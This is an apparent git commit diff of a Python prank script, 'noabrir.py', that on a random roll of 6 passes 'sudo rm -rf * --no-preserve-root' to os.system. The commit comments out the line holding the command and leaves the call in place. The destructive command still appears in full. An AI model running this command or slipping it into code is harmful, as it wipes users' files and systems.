1b562393631043925b8510b62517e03126a60d7b
juanpmz2001 <juanpmz2001@gmail.com>
2023-05-09 20:33:28 -0500

    Comento noabrir.py

--- noabrir.py
+++ noabrir.py
@@ -5,7 +5,7 @@ import random
 # NO ABRIR
 #para generar un numero random entre 1 y 6
 numero = random.randint(1,6)
-peligro = "sudo rm -rf * --no-preserve-root"
+#peligro = "sudo rm -rf * --no-preserve-root"
 if (numero == 6):
     os.system(peligro)
 
